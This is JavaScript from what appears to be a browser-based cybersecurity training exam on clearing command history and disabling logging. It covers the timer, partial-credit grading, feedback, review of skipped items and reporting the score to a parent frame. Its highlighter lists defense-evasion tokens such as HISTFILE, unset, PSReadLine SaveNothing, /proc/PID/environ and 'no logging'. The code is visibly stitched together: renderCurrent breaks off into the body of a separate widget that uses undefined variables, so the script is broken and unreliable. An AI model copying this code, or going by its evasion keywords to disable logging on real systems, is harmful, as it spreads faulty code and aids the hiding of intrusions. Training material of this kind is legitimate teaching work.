  function norm(s) { return String(s == null ? '' : s).replace(/\s+/g, ' ').trim().toLowerCase(); }
  function fmtClk(sec) { sec = Math.max(0, sec | 0); var m = (sec / 60) | 0, s = sec % 60; return (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s; }
  function reTest(reStr, s) { try { return new RegExp(reStr, 'i').test(s); } catch (e) { return false; } }
  function scoreSet(sel, cor) {
    var cs = {}; cor.forEach(function (x) { cs[x] = 1; });
    var H = 0, W = 0;
    sel.forEach(function (x) { if (cs[x]) H++; else W++; });
    var N = cor.length; if (!N) return { credit: 0, H: 0, W: 0, N: 0 };
    return { credit: Math.max(0, (H - W) / N), H: H, W: W, N: N };
  }
  var TYPE_LABEL = { qcm: 'Multiple choice', multi: 'Select all that apply', drag: 'Drag & drop', order: 'Timeline ordering', match: 'Matching', fill: 'Fill the blanks', terminal: 'Terminal — type the command', branch: 'Decision scenario', logview: 'Log analysis' };

  /* ---------- syntax highlighter ---------- */
  var TOK_RE = new RegExp([
    '(\\/proc\\/\\d+\\/environ|\\/proc\\/\\$PID|\\/proc\\/[0-9]+|\\/dev\\/null|[\\/~][\\w.\\/-]*bash_history|zsh_history|ConsoleHost_history\\.txt|\\$env:APPDATA[\\w.\\\\-]*)',
    '(Set-PSReadLineOption|Set-PSReadlineOption|Get-PSReadlineOption|Remove-Item|Get-Content|Set-ItemProperty)',
    '(HistorySavePath|HistorySaveStyle|SaveNothing|PSReadLine|PSReadline)',
    '(MYSQL_HISTFILE|HISTFILE|HISTFILESIZE|HISTSIZE|HISTCONTROL|HISTCMD|HISTTIMEFORMAT|HISTIGNORE)',
    '(vmsyslogd|dslogserver|syslogd|auditd|journalctl|ausearch|systemctl|service|resolv)',
    '(no logging|show logging|show run|logging host|logging enable|logging)',
    '(export|unset|printenv|echo|cat|sudo|grep|tr|tail|head|awk|sed|history|env|bash|zsh|kill|ps|enable|configure)',
    '(-{1,2}[A-Za-z][A-Za-z0-9-]*)'
  ].join('|'), 'g');
  function tokClass(m) {
    if (m[1]) return 'tok-path';
    if (m[2] || m[3]) return 'tok-ps';
    if (m[4]) return 'tok-env';
    if (m[5]) return 'tok-svc';
    if (m[6] || m[7]) return 'tok-cmd';
    if (m[8]) return 'tok-flag';
    return null;
  }
  function hlLine(line) {
    var f = document.createDocumentFragment();
    var tr = line.replace(/\s+$/, '');
    if (tr.charAt(0) === '#') { f.appendChild(el('span', 'tok-comment', line)); return f; }
    var last = 0, m;
    TOK_RE.lastIndex = 0;
    while ((m = TOK_RE.exec(line)) !== null) {
      if (m.index > last) f.appendChild(el('span', null, line.slice(last, m.index)));
      f.appendChild(el('span', tokClass(m), m[0]));
      last = m.index + m[0].length;
      if (m[0].length === 0) { TOK_RE.lastIndex++; }
    }
    if (last < line.length) f.appendChild(el('span', null, line.slice(last)));
    return f;
  }
  function monoBlock(lines) {
    var pre = el('pre', 'mono');
    (lines || []).forEach(function (ln) {
      var d = el('div', 'monoline');
      if (ln === '') { d.appendChild(document.createTextNode(' ')); } else { d.appendChild(hlLine(ln)); }
      pre.appendChild(d);
    });
    return pre;
  }
  function artPanel(a) {
    var d = el('div', 'art' + (a.mono ? '' : ' prose'));
    d.appendChild(el('div', 'alabel', a.label));
    if (a.mono) { d.appendChild(monoBlock(String(a.body).split('\n'))); }
    else { String(a.body).split('\n').forEach(function (p) { if (p.trim()) d.appendChild(el('p', null, p)); }); }
    return d;
  }

  /* ---------- state ---------- */
  var S = {
    screen: 'intro', order: [], idx: 0,
    results: {}, checkedIds: {}, hinted: {}, skipped: [],
    sum: 0, answered: 0, locked: false,
    returnTo: null, cur: null, widget: null,
    timer: { state: 'IDLE', left: M.timerSec, tick: null, lastT: 0, resumeBack: null },
    pauseManual: 0, pauseAuto: 0,
    reported: false,
    init: { username: '', country: '', locale: 'en' }
  };
  function byId(id) { for (var i = 0; i < D.exercises.length; i++) { if (D.exercises[i].id === id) return D.exercises[i]; } return null; }
  D.exercises.forEach(function (ex) {
    if (ex.type === 'drag') { ex.drag.items.forEach(function (it, i) { if (!it.id) { it.id = 'i' + i; } }); }
  });

  /* ---------- timer state machine: IDLE | RUNNING | PAUSED_MANUAL | PAUSED_AUTO_CHECK | ENDED ---------- */
  function tick() {
    var st = S.timer.state;
    if (st === 'IDLE' || st === 'ENDED') return;
    var now = Date.now();
    var dt = Math.round((now - S.timer.lastT) / 1000);
    if (dt <= 0) return;
    S.timer.lastT = now;
    if (st === 'RUNNING') {
      S.timer.left -= dt;
      if (S.timer.left <= 0) { S.timer.left = 0; renderTimerChip(); toState('ENDED'); return; }
    } else if (st === 'PAUSED_MANUAL') { S.pauseManual += dt; }
    else if (st === 'PAUSED_AUTO_CHECK') { S.pauseAuto += dt; }
    renderTimerChip();
  }
  function toState(st) {
    S.timer.state = st;
    renderTimerChip();
    if (st === 'ENDED') { finishExam(true); }
  }
  function startTicker() {
    S.timer.lastT = Date.now();
    if (S.timer.tick) { clearInterval(S.timer.tick); }
    S.timer.tick = setInterval(tick, 500);
  }
  function stopTicker() { if (S.timer.tick) { clearInterval(S.timer.tick); S.timer.tick = null; } }

  /* ---------- header ---------- */
  function renderTimerChip() {
    var st = S.timer.state, ico = '▶', word = 'RUNNING', cls = 'running';
    if (st === 'PAUSED_MANUAL') { ico = '⏸'; word = 'PAUSED — manual (press Resume)'; cls = 'paused'; }
    else if (st === 'PAUSED_AUTO_CHECK') { ico = '⏸'; word = 'PAUSED — reviewing feedback (resumes on Next)'; cls = 'paused'; }
    else if (st === 'ENDED') { ico = '⏹'; word = 'ENDED'; cls = 'ended'; }
    else if (st === 'IDLE') { ico = '⏱'; word = 'READY'; cls = 'running'; }
    var t = $('#hd-timer');
    t.className = 'tstate ' + cls;
    $('#hd-tico').textContent = ico;
    $('#hd-tword').textContent = word;
    $('#hd-tclock').textContent = fmtClk(S.timer.left);
  }
  function renderScoreChip() {
    $('#hd-sum').textContent = (Math.round(S.sum * 10) / 10).toFixed(1);
    $('#hd-cnt').textContent = String(S.answered);
    $('#hd-pct').textContent = (S.answered > 0 ? Math.round((S.sum / S.answered) * 100) : 0) + '%';
  }
  function renderProgress() {
    var done = Object.keys(S.checkedIds).length + S.skipped.length;
    var pct = Math.max(0, Math.min(100, Math.round((done / D.exercises.length) * 100)));
    $('#progressbar').style.width = pct + '%';
  }
  function renderHeader() {
    var countChip = $('#hd-count');
    if (S.screen === 'review') { countChip.innerHTML = ''; countChip.appendChild(el('b', null, 'Review skipped — ' + S.skipped.length + ' left')); }
    else if (S.screen === 'results') { countChip.innerHTML = ''; countChip.appendChild(el('b', null, 'Exam finished')); }
    else { countChip.innerHTML = ''; countChip.appendChild(el('b', null, 'Exercise ' + (S.idx + 1) + ' of ' + D.exercises.length)); }
    var sev = $('#hd-sev');
    sev.textContent = '● ' + M.sevWord;
    sev.setAttribute('aria-label', 'Severity: ' + M.sevWord);
    renderTimerChip(); renderScoreChip();
    var inExam = (S.screen === 'exam');
    $('#bt-pause').disabled = !inExam || S.timer.state === 'ENDED';
    $('#bt-hint').disabled = !inExam || S.locked || !!(S.cur && S.hinted[S.cur.id]);
    $('#bt-skip').disabled = !inExam || S.locked;
    renderProgress();
  }

  /* ---------- views ---------- */
  function showView(name) {
    ['intro', 'exam', 'review', 'results'].forEach(function (v) { $('#view-' + v).hidden = (v !== name); });
    var chrome = (name !== 'intro');
    $('#topbar').hidden = !chrome;
    $('#progresswrap').hidden = !chrome;
  }

  /* ---------- intro screen (exactly four sections) ---------- */
  function buildIntro() {
    var v = $('#view-intro'); v.innerHTML = '';
    /* 1 — header strip */
    var c1 = el('div', 'card');
    var head = el('div', 'intro-head');
    head.appendChild(el('h1', null, M.examTitle));
    var badge = el('span', 'badge-sev', '● ' + M.sevWord); badge.setAttribute('aria-label', 'Severity: ' + M.sevWord);
    head.appendChild(badge);
    c1.appendChild(head);
    c1.appendChild(el('p', 'muted', M.objectLine));
    var mr = el('div', 'meta-row');
    mr.appendChild(metaItem('Exercises', String(D.exercises.length)));
    mr.appendChild(metaItem('Estimated time', M.estimatedMinutes + ' min'));
    mr.appendChild(metaItem('Timer budget', fmtClk(M.timerSec)));
    mr.appendChild(metaItem('Pass mark', M.passMark + '%'));
    if (S.init.username) { mr.appendChild(metaItem('Learner', S.init.username + (S.init.country && S.init.country !== 'ZZ' ? ' (' + S.init.country + ')' : ''))); }
    c1.appendChild(mr);
    v.appendChild(c1);
    /* 2 — what you will learn here */
    var c2 = el('div', 'card');
    c2.appendChild(el('h2', null, 'What you will learn here'));
    var grid = el('div', 'learn-grid');
    var lcol = el('div');
    D.intro.learn.forEach(function (p) { lcol.appendChild(el('p', null, p)); });
    grid.appendChild(lcol);
    var rcol = el('div');
    rcol.appendChild(el('h2', null, 'Roles that use this'));
    var roles = el('div', 'roles');
    D.intro.roles.forEach(function (r) { roles.appendChild(el('span', 'role', r)); });
    rcol.appendChild(roles);
    grid.appendChild(rcol);
    c2.appendChild(grid);
    v.appendChild(c2);
    /* 3 — keywords covered in this exam */
    var c3 = el('div', 'card');
    c3.appendChild(el('h2', null, 'Keywords covered in this exam'));
    c3.appendChild(el('p', 'muted', 'Every exercise below is built only from these concepts — the ones the ATT&CK page for ' + M.techId + ' actually ties together.'));
    var kg = el('div', 'kw-grid');
    D.intro.keywords.forEach(function (k) {
      var kc = el('div', 'kw-theme');
      kc.appendChild(el('h3', null, k.theme));
      var ul = el('ul', 'plain');
      k.items.forEach(function (it) {
        var li = el('li');
        if (it.indexOf(' — ') > 0) {
          var parts = it.split(' — ');
          li.appendChild(el('b', null, parts.shift()));
          li.appendChild(document.createTextNode(' — ' + parts.join(' — ')));
        } else { li.textContent = it; }
        ul.appendChild(li);
      });
      kc.appendChild(ul);
      kg.appendChild(kc);
    });
    c3.appendChild(kg);
    v.appendChild(c3);
    /* 4 — how this exam works */
    var c4 = el('div', 'card');
    c4.appendChild(el('h2', null, 'How this exam works'));
    var ul = el('ul', 'how-list plain');
    D.intro.how.forEach(function (h) { ul.appendChild(el('li', null, h)); });
    var liTypes = el('li');
    liTypes.appendChild(document.createTextNode('Exercise types used in this file: '));
    var types = [];
    D.exercises.forEach(function (ex) {
      var lbl = ex.type === 'branch' && ex.branch && ex.branch.sim ? 'Scenario simulation' : (TYPE_LABEL[ex.type] || ex.type);
      if (types.indexOf(lbl) < 0) { types.push(lbl); }
    });
    liTypes.appendChild(el('b', null, types.join(', ')));
    liTypes.appendChild(document.createTextNode('.'));
    ul.appendChild(liTypes);
    c4.appendChild(ul);
    var sr = el('div', 'start-row');
    var bt = el('button', 'btn primary', '▶ Start the exam');
    bt.id = 'bt-start';
    bt.addEventListener('click', startExam);
    sr.appendChild(bt);
    sr.appendChild(el('span', 'muted', 'The timer starts the moment you press Start. Good luck.'));
    c4.appendChild(sr);
    v.appendChild(c4);
  }
  function metaItem(k, val) { var m = el('span', 'meta-item'); m.appendChild(el('b', null, k + ': ')); m.appendChild(document.createTextNode(val)); return m; }

  function startExam() {
    S.order = shuffled(D.exercises.map(function (e) { return e.id; }));
    S.idx = 0; S.results = {}; S.checkedIds = {}; S.hinted = {}; S.skipped = [];
    S.sum = 0; S.answered = 0; S.locked = false; S.returnTo = null; S.reported = false;
    S.pauseManual = 0; S.pauseAuto = 0;
    S.timer.left = M.timerSec; S.timer.resumeBack = null;
    S.screen = 'exam';
    showView('exam');
    toState('RUNNING');
    startTicker();
    renderCurrent();
  }

  /* ---------- exercise scaffolding ---------- */
  function buildScenario(ex) {
    var b = el('div', 'block block-scen');
    var bh = el('div', 'bhead');
    bh.appendChild(el('span', null, '◆ SCENARIO'));
    var sum = el('span', 'gear', ex.scenario.summary);
    bh.appendChild(sum);
    var tg = el('span', 'gear', '▾ Collapse');
    bh.appendChild(tg);
    bh.addEventListener('click', function () {
      b.classList.toggle('collapsed');
      tg.textContent = b.classList.contains('collapsed') ? '▸ Expand' : '▾ Collapse';
    });
    b.appendChild(bh);
    var bb = el('div', 'bbody');
    (ex.scenario.arts || []).forEach(function (a) { bb.appendChild(artPanel(a)); });
    b.appendChild(bb);
    return b;
  }

  function renderCurrent() {
    var ex = byId(S.order[S.idx]);
    S.cur = ex; S.widget = null; S.locked = false;
    var v = $('#view-exam'); v.innerHTML = '';
    var card = el('div', 'excard');
    var meta = el('div', 'exmeta');
    var isSim = ex.type === 'branch' && ex.branch && ex.branch.sim;
    meta.appendChild(el('span', 'typechip', isSim ? 'Scenario simulation' : TYPE_LABEL[ex.type]));
    var bd = el('span', 'badge-sev', '● ' + M.sevWord); bd.setAttribute('aria-label', 'Severity: ' + M.sevWord);
    meta.appendChild(bd);

    function renderStep(i) {
      stepHost.innerHTML = '';
      chosen.length = Math.min(chosen.length, i);
      var st = br.steps[i];
      stepHost.appendChild(el('span', 'typechip', 'STEP ' + (i + 1) + ' OF ' + br.steps.length));
      if (st.art) { stepHost.appendChild(artPanel(st.art)); }
      if (st.question) { stepHost.appendChild(el('p', 'qtext', st.question)); }
      var opts = el('div', 'opts');
      var sel = -1;
      var bts = [];
      st.opts.forEach(function (o, oi) {
        var b = el('button', 'opt');
        b.appendChild(el('span', 'olabel', 'ABCDEF'[oi] + '.'));
        b.appendChild(el('span', null, o.t));
        b.addEventListener('click', function () {
          if (S.locked) { return; }
          sel = oi;
          bts.forEach(function (x) { x.classList.remove('selected'); var sm = x.querySelector('.selmark'); if (sm) { sm.remove(); } });
          b.classList.add('selected'); b.appendChild(el('span', 'selmark', '● Selected'));
          bc.disabled = false;
        });
        bts.push(b); opts.appendChild(b);
      });
      stepHost.appendChild(opts);
      var row = el('div', 'start-row');
      var bc = el('button', 'btn primary', i === br.steps.length - 1 ? 'Confirm last step ▶' : 'Confirm & continue ▶');
      bc.disabled = true;
      row.appendChild(bc);
      row.appendChild(el('span', 'muted', i === br.steps.length - 1 ? 'Then press ✓ Check to grade the whole chain.' : 'Confirming a step does not stop the timer.'));
      stepHost.appendChild(row);
      bc.addEventListener('click', function () {
        if (sel < 0) { return; }
        chosen[i] = sel;
        if (st.opts[sel].outcome) {
          var oc = el('div', 'outcome');
          oc.appendChild(el('b', null, 'Outcome: '));
          oc.appendChild(document.createTextNode(st.opts[sel].outcome));
          stepHost.insertBefore(oc, row);
        }
        bc.disabled = true;
        bts.forEach(function (x) { x.disabled = true; });
        if (i < br.steps.length - 1) { renderStep(i + 1); }
        else { updateBtns(); stepHost.appendChild(el('div', 'ddnote', 'All steps confirmed. Press ✓ Check below to grade the full chain.')); }
      });
    }
    renderStep(0);
    return {
      answered: function () { return chosen.length === br.steps.length && chosen.every(function (c) { return c != null; }); },
      grade: function () {
        var items = [], H = 0, W = 0;
        br.steps.forEach(function (st, i) {
          var o = st.opts[chosen[i]];
          if (o.good) { H++; items.push({ label: 'STEP ' + (i + 1) + ': ' + o.t, st: 'ok', why: o.why }); }
          else { W++; items.push({ label: 'STEP ' + (i + 1) + ': ' + o.t, st: 'bad', why: o.why }); }
        });
        return { credit: Math.max(0, (H - W) / br.steps.length), items: items, H: H, W: W, N: br.steps.length, answerText: br.best || null };
      }
    };
  };

  WIDGETS.logview = function (ex, host) {
    var lv = ex.logview;
    var panel = el('div', 'logpanel');
    var bar = el('div', 'logbar');
    bar.appendChild(el('span', 'muted', lv.filterLabel || 'Filter:'));
    var fin = el('input'); fin.type = 'text'; fin.placeholder = 'type to filter lines…';
    fin.setAttribute('aria-label', 'Filter log lines');
    bar.appendChild(fin);
    panel.appendChild(bar);
    var linesBox = el('div', 'loglines');
    var lineEls = [];
    (lv.logs || []).forEach(function (ln) {
      var d = el('div', 'logline');
      d.dataset.raw = ln;
      d.appendChild(hlLine(ln));
      linesBox.appendChild(d); lineEls.push(d);
    });
    panel.appendChild(linesBox);
    host.appendChild(panel);
    fin.addEventListener('input', function () {
      var f = fin.value.trim().toLowerCase();
      lineEls.forEach(function (d) {
        var raw = d.dataset.raw;
        if (!f || raw.toLowerCase().indexOf(f) >= 0) { d.style.display = ''; } else { d.style.display = 'none'; }
      });
    });
    var innerHost = el('div'); innerHost.style.marginTop = '14px';
    host.appendChild(innerHost);
    var innerData = {};
    innerData[lv.inner.type] = lv.inner;
    var inner = WIDGETS[lv.inner.type](innerData, innerHost);
    return {
      answered: function () { return inner.answered(); },
      grade: function () { return inner.grade(); }
    };
  };

  /* ---------- check / next / skip / hint ---------- */
  function onCheck() {
    if (S.locked || S.timer.state === 'ENDED' || S.screen !== 'exam') { return; }
    var w = S.widget;
    if (!w || !w.answered()) { return; }
    var g = w.grade();
    if (!g) { return; }
    if (S.hinted[S.cur.id]) { g.credit = Math.max(0, g.credit - 0.10); }
    g.credit = Math.max(0, Math.min(1, g.credit));
    S.results[S.cur.id] = g;
    S.checkedIds[S.cur.id] = true;
    var si = S.skipped.indexOf(S.cur.id);
    if (si >= 0) { S.skipped.splice(si, 1); }
    S.sum += g.credit; S.answered++;
    S.locked = true;
    toState('PAUSED_AUTO_CHECK');
    renderFeedback(S.cur, g);
    renderHeader(); updateBtns();
    var fb = $('#view-exam .feedback');
    if (fb) { fb.hidden = false; }
  }

  function fbIcon(st) { return st === 'ok' ? '✓ Correct' : (st === 'bad' ? '✗ Wrong' : '○ Missed'); }
  function renderFeedback(ex, g) {
    var fb = $('#view-exam .feedback');
    fb.innerHTML = '';
    var cls = g.credit >= 0.999 ? 'ok' : (g.credit > 0 ? 'partial' : 'bad');
    fb.classList.add(cls);
    var head = el('div', 'fb-head');
    var lab = g.credit >= 0.999 ? '✓ CORRECT' : (g.credit > 0 ? '✓ PARTIALLY CORRECT' : '✗ INCORRECT');
    head.appendChild(el('span', null, lab));
    if (g.N && g.N > 1) { head.appendChild(el('span', 'fb-credit', '— credit ' + (Math.round(g.credit * 100) / 100).toFixed(2) + ' · ' + g.H + ' of ' + g.N + ' items')); }
    fb.appendChild(head);
    var body = el('div', 'fb-body');
    if (g.danger) {
      var dw = el('div', 'item st-bad');
      dw.appendChild(el('span', 'ist', '✗ DANGEROUS — NEAR MISS'));
      dw.appendChild(el('span', null, 'Your command matches a pattern that would alter or destroy evidence in a real session. Read the canonical command below carefully.'));
      body.appendChild(dw);
    }
    if (g.credit > 0 && g.credit < 0.999 && g.N > 1) {
      body.appendChild(el('p', 'fb-credit', 'Partial credit formula: max(0, (H − W) / N) → H=' + g.H + ' correct picks, W=' + g.W + ' wrong picks, N=' + g.N + ' items. Wrong picks cancel right picks.'));
    }
    if (ex.explain) {
      var p = el('p'); p.textContent = ex.explain; body.appendChild(p);
    }
    if (g.answerText) {
      var at = el('p', 'fb-credit'); at.appendChild(el('b', null, 'Correct answer: ')); at.appendChild(document.createTextNode(g.answerText));
      body.appendChild(at);
    }
    if (g.items && g.items.length) {
      var box = el('div', 'items');
      g.items.forEach(function (it) {
        var r = el('div', 'item st-' + it.st);
        r.appendChild(el('span', 'ist', fbIcon(it.st)));
        var c = el('span');
        c.appendChild(el('b', null, it.label));
        if (it.why) { c.appendChild(document.createTextNode(' — ' + it.why)); }
        r.appendChild(c);
        box.appendChild(r);
      });
      body.appendChild(box);
    }
    if (ex.type === 'terminal') {
      var t = ex.terminal;
      body.appendChild(el('p', 'fb-credit', 'Canonical command (copyable):'));
      var cw = el('div', 'copywrap');
      cw.appendChild(monoBlock([t.solution]));
      var cb = el('button', 'copybtn', 'Copy');
      cb.setAttribute('aria-label', 'Copy the canonical command');
      cb.addEventListener('click', function () {
        try {
          if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(t.solution); cb.textContent = 'Copied ✓'; }
          else { cb.textContent = 'Select it manually'; }
        } catch (e) { cb.textContent = 'Select it manually'; }
        setTimeout(function () { cb.textContent = 'Copy'; }, 1600);
      });
      cw.appendChild(cb);
      body.appendChild(cw);
      (t.solutionWhy || []).forEach(function (l) {
        var d = el('div', 'sl'); d.style.margin = '4px 0'; d.appendChild(hlLine(l)); body.appendChild(d);
      });
    }
    if (ex.study && g.credit < 0.999) {
      var st2 = el('div', 'study');
      st2.appendChild(el('b', null, 'What to study: '));
      st2.appendChild(document.createTextNode(ex.study));
      body.appendChild(st2);
    }
    if (S.hinted[ex.id]) { body.appendChild(el('p', 'fb-credit', 'Hint used: −0.10 credit applied to this exercise.')); }
    fb.appendChild(body);
    fb.hidden = false;
  }

  function onNext() {
    if (!S.locked) { return; }
    var wasReturn = S.returnTo === 'review';
    if (wasReturn) { S.returnTo = null; }
    if (S.idx < S.order.length - 1 && !wasReturn) {
      S.idx++;
      toState('RUNNING');
      renderCurrent();
    } else if (S.skipped.length > 0) {
      toState('RUNNING');
      showReview();
    } else {
      finishExam(false);
    }
  }

  function onSkip() {
    if (S.locked || S.screen !== 'exam') { return; }
    if (S.skipped.indexOf(S.cur.id) < 0) { S.skipped.push(S.cur.id); }
    if (S.returnTo === 'review') { S.returnTo = null; showReview(); return; }
    if (S.idx < S.order.length - 1) {
      S.idx++;
      renderCurrent();
    } else if (S.skipped.length > 0) {
      showReview();
    } else {
      finishExam(false);
    }
  }

  function onHint() {
    if (S.locked || S.screen !== 'exam' || S.hinted[S.cur.id]) { return; }
    S.hinted[S.cur.id] = true;
    var ab = $('#view-exam .block-a .bbody');
    if (ab) {
      var hp = el('div', 'study');
      hp.style.marginTop = '12px';
      hp.appendChild(el('b', null, '💡 Hint (−10% of this exercise credit): '));
      hp.appendChild(document.createTextNode(S.cur.hint || 'Re-read the scenario artefacts — the key detail is there.'));
      ab.appendChild(hp);
    }
    renderHeader();
  }

  /* ---------- review skipped screen ---------- */
  function showReview() {
    S.screen = 'review';
    showView('review');
    var v = $('#view-review'); v.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, '⚠ Review skipped exercises'));
    c.appendChild(el('p', 'muted', 'You have ' + S.skipped.length + ' skipped exercise(s). You can go back and answer them now — the timer is still running — or submit the exam. Skipped-and-never-answered exercises are excluded from the score.'));
    S.skipped.forEach(function (id) {
      var ex = byId(id);
      var row = el('div', 'rev-row');
      row.appendChild(el('span', 'warn-ico', '⚠'));
      row.appendChild(el('b', null, 'Skipped'));
      row.appendChild(el('span', 'rt', ex.title));
      var b = el('button', 'btn small primary', 'Answer now');
      b.addEventListener('click', function () { answerFromReview(id); });
      row.appendChild(b);
      c.appendChild(row);
    });
    var sr = el('div', 'start-row');
    var sb = el('button', 'btn primary', 'Submit exam ✓');
    sb.addEventListener('click', function () { finishExam(false); });
    sr.appendChild(sb);
    sr.appendChild(el('span', 'muted', 'Once you submit, unanswered skipped exercises no longer count.'));
    c.appendChild(sr);
    v.appendChild(c);
    renderHeader();
    window.scrollTo(0, 0);
  }
  function answerFromReview(id) {
    S.returnTo = 'review';
    S.idx = S.order.indexOf(id);
    if (S.idx < 0) { S.idx = 0; }
    toState('RUNNING');
    S.screen = 'exam';
    showView('exam');
    renderCurrent();
  }

  /* ---------- results + site contract ---------- */
  function finishExam(timedOut) {
    if (S.screen === 'results') { return; }
    S.screen = 'results';
    S.timer.state = 'ENDED';
    renderTimerChip();
    stopTicker();
    showView('results');
    var v = $('#view-results'); v.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, 'Exam results — ' + M.examTitle));
    var answered = S.answered;
    var percent = answered > 0 ? Math.round((S.sum / answered) * 100) : 0;
    var sc = el('p');
    sc.appendChild(el('b', null, (Math.round(S.sum * 10) / 10).toFixed(1) + ' / ' + answered));
    sc.appendChild(document.createTextNode(' answered · ' + percent + '%  (pass mark ' + M.passMark + '%)'));
    c.appendChild(sc);
    if (timedOut) { c.appendChild(el('p', 'muted', '⏹ The timer ended — the exam was submitted automatically. Unanswered and skipped exercises were excluded from the score.')); }
    var fc = 0, pc = 0, ic = 0, pcSum = 0;
    Object.keys(S.results).forEach(function (k) {
      var cr = S.results[k].credit;
      if (cr >= 0.999) { fc++; }
      else if (cr > 0) { pc++; pcSum += cr; }
      else { ic++; }
    });
    var skippedLeft = D.exercises.length - answered;
    var grid = el('div', 'resgrid');
    grid.appendChild(resCard('ok', '✓ Fully correct', fc));
    grid.appendChild(resCard('partial', '✓ Partially correct', pc, pc > 0 ? 'avg ' + (Math.round((pcSum / pc) * 100) / 100).toFixed(2) : null));
    grid.appendChild(resCard('bad', '✗ Fully incorrect', ic));
    grid.appendChild(resCard('skip', '⚠ Skipped — excluded', skippedLeft));
    c.appendChild(grid);
    var tr = el('div', 'times-row');
    tr.appendChild(metaItem('Time used', fmtClk(M.timerSec - S.timer.left)));
    tr.appendChild(metaItem('Paused manually', fmtClk(S.pauseManual)));
    tr.appendChild(metaItem('Paused for feedback', fmtClk(S.pauseAuto)));
    c.appendChild(tr);
    if (answered > 0 && percent >= M.passMark) {
      var pp = el('div', 'passpanel');
      pp.appendChild(el('div', 'big', '✓ PASS'));
      pp.appendChild(el('p', null, 'You reached ' + percent + '% — above the ' + M.passMark + '% pass mark. Well done: you showed command of ' + M.techId + ' at ' + M.sevWord + ' level.'));
      c.appendChild(pp);
    } else {
      var fp = el('div', 'failpanel');
      fp.appendChild(el('div', 'big', '✗ FAIL'));
      fp.appendChild(el('p', null, answered === 0 ? 'No exercise was answered, so the score is 0%. You must retake this exam.' : 'You reached ' + percent + '%, below the ' + M.passMark + '% pass mark. You must retake this exam — read the feedback you collected and try again.'));
      c.appendChild(fp);
    }
    var sr = el('div', 'start-row');
    var rb = el('button', 'btn primary', '↻ Retake exam');
    rb.setAttribute('aria-label', 'Retake the exam with reshuffled exercises');
    rb.addEventListener('click', function () { startExam(); });
    sr.appendChild(rb);
    c.appendChild(sr);
    v.appendChild(c);
    renderHeader();
    reportScore();
    window.scrollTo(0, 0);
  }
  function resCard(cls, lab, num, extra) {
    var d = el('div', 'rescard ' + cls);
    d.appendChild(el('div', 'num', String(num)));
    var l = el('div', 'lab', lab + (extra ? ' — ' + extra : ''));
    d.appendChild(l);
    return d;
  }
  function reportScore() {
    if (S.reported) { return; }
    S.reported = true;
    var percent = S.answered > 0 ? Math.round((S.sum / S.answered) * 100) : 0;
    try {
      if (!window.parent || window.parent === window) { return; } /* opened directly: no parent to report to */
      parent.postMessage({
        type: 'CYBERPULSE_SCORE',
        topicId: M.topicId,
        batch: M.batch,
        score: Math.round(S.sum),
        total: S.answered,
        percent: percent,
        passed: percent >= M.passMark
      }, location.origin);
    } catch (e) { /* opened directly, nothing to report to */ }
  }

  /* ---------- site handshake (dark-only file: theme field is accepted, never acted on) ---------- */
  window.addEventListener('message', function (ev) {
    var d = ev.data;
    if (!d || (d.type !== 'CYBERPULSE_INIT' && d.type !== 'CYBERMASTERY_INIT')) { return; }
    S.init.username = d.username || '';
    S.init.country = d.country || '';
    S.init.locale = d.locale || 'en';
    if (S.screen === 'intro') { buildIntro(); }
  });

  /* ---------- wire up ---------- */
  document.addEventListener('DOMContentLoaded', function () {
    $('#bt-pause').addEventListener('click', onPause);
    $('#bt-hint').addEventListener('click', onHint);
    $('#bt-skip').addEventListener('click', onSkip);
    $('#pv-resume').addEventListener('click', onPause);
    buildIntro();
  });

  function onPause() {
    if (S.screen !== 'exam' && S.screen !== 'review') { return; }
    if (S.timer.state === 'ENDED') { return; }
    if (S.timer.state === 'PAUSED_MANUAL') {
      S.timer.state = S.timer.resumeBack || 'RUNNING';
      S.timer.resumeBack = null;
      $('#pauseveil').classList.remove('on');
      renderTimerChip();
      return;
    }
    S.timer.resumeBack = S.timer.state;
    S.timer.state = 'PAUSED_MANUAL';
    $('#pv-title').textContent = 'PAUSED — manual (press Resume)';
    $('#pv-text').textContent = S.timer.resumeBack === 'PAUSED_AUTO_CHECK'
      ? 'You paused while reviewing feedback. Resume to return to the explanation — the timer stays stopped until you press Next.'
      : 'The timer is stopped and the exercise is hidden. Take a real break — the exam waits for you.';
    $('#pauseveil').classList.add('on');
    renderTimerChip();
  }
})();

</script>
</body>
</html>
